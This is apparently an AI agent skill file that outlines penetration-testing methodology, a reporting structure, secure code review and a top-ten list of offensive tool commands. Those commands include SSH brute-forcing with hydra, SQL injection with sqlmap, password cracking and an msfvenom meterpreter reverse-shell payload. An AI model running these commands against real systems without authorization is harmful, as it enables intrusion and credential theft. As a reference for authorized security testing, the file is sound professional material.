---
name: Pentest Methodology
description: >
  Use this skill when the user asks to plan, execute, or report on a penetration test,
  perform reconnaissance or network scanning, run exploit tools (nmap, metasploit, hydra,
  sqlmap, nikto), crack passwords, review code for security vulnerabilities, create a
  security assessment checklist, implement secure authentication/authorization, validate
  input, prevent SQL injection or XSS, or follow ethical hacking methodology. Covers the
  full pentest lifecycle: scoping, recon, scanning, exploitation, post-exploitation,
  reporting, and secure code review.
metadata:
  author: consolidated
  version: "1.0"
  sources:
    - ethical-hacking-methodology (zebbern)
    - pentest-checklist (zebbern)
    - pentest-commands (zebbern)
    - cc-skill-security-review (affaan-m)
---

# Pentest Methodology

Consolidated penetration testing and security review skill covering the full lifecycle from planning through remediation, including tool command references and secure code review patterns.

## Reference Files

Detailed content is organized into focused reference documents:

| Reference | Contents | Use When |
|-----------|----------|----------|
| [references/methodology.md](references/methodology.md) | Ethical hacking lifecycle, recon, scanning, exploitation, reporting, attack types | Learning methodology, planning phases, understanding attack patterns |
| [references/checklist.md](references/checklist.md) | Scoping, environment prep, tester selection, monitoring, remediation checklists | Planning an engagement, pre/post-pentest verification |
| [references/commands.md](references/commands.md) | Nmap, Metasploit, Nikto, SQLMap, Hydra, John, Aircrack-ng, Tshark commands | Running specific tools, quick command lookup |
| [references/code-review.md](references/code-review.md) | Secrets management, input validation, SQLi/XSS/CSRF prevention, auth patterns | Writing or reviewing application code for security |

## Quick Start by Task

### Planning a Pentest
1. Define objectives, scope, and test type -- see [checklist.md](references/checklist.md) Phase 1
2. Prepare environment and get authorization -- see [checklist.md](references/checklist.md) Phase 2
3. Select methodology (PTES/OWASP/NIST) and approach (black/gray/white box)

### Executing a Pentest
1. **Recon**: WHOIS, DNS, OSINT, social media -- see [methodology.md](references/methodology.md) Phase 1-2
2. **Scanning**: `nmap -sV -sC -A -p- TARGET` -- see [commands.md](references/commands.md) Nmap
3. **Vulnerability analysis**: Nikto, Gobuster, NSE scripts -- see [commands.md](references/commands.md) Nikto
4. **Exploitation**: Metasploit, SQLMap, Hydra -- see [commands.md](references/commands.md) Metasploit/SQLMap/Hydra
5. **Post-exploitation**: Privilege escalation, persistence -- see [methodology.md](references/methodology.md) Phase 5

### Writing a Pentest Report
Structure: Executive Summary, Technical Findings (with PoC), Risk Ratings (Critical/High/Medium/Low/Info), Remediation Recommendations, Appendices. See [methodology.md](references/methodology.md) Phase 6.

### Reviewing Code for Security
Run through the pre-deployment checklist: secrets, input validation, SQLi, XSS, CSRF, auth, rate limiting, headers, error handling, dependencies. See [code-review.md](references/code-review.md).

## Essential Commands (Top 10)

```bash
nmap -sV -sC -A -p- TARGET                    # Full port/service/OS scan
nmap --script vuln TARGET                       # Vulnerability scan
nikto -h http://TARGET                          # Web vulnerability scan
gobuster dir -u http://TARGET -w wordlist.txt   # Directory brute force
sqlmap -u "http://TARGET/page?id=1" --dbs       # SQL injection
hydra -l admin -P wordlist.txt ssh://TARGET      # SSH brute force
msfconsole                                      # Launch Metasploit
john hash.txt --wordlist=rockyou.txt            # Crack passwords
tshark -i eth0 -w capture.pcap                  # Capture traffic
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe  # Payload
```

## Ethical & Legal Requirements

- **Always** obtain written authorization before testing
- **Always** define and respect scope boundaries
- **Always** document all testing activities
- **Always** report all findings to the client
- **Always** maintain confidentiality
- **Never** use findings for personal gain
- **Never** test without permission
- Check cloud provider pentest policies (AWS, Azure, GCP) before testing hosted targets

## Key Frameworks & Standards

| Framework | Focus |
|-----------|-------|
| PTES | Penetration Testing Execution Standard |
| OWASP | Web application security (Top 10) |
| NIST | Risk management and controls |
| CVSS | Vulnerability scoring |
| MITRE ATT&CK | Adversary tactics and techniques |
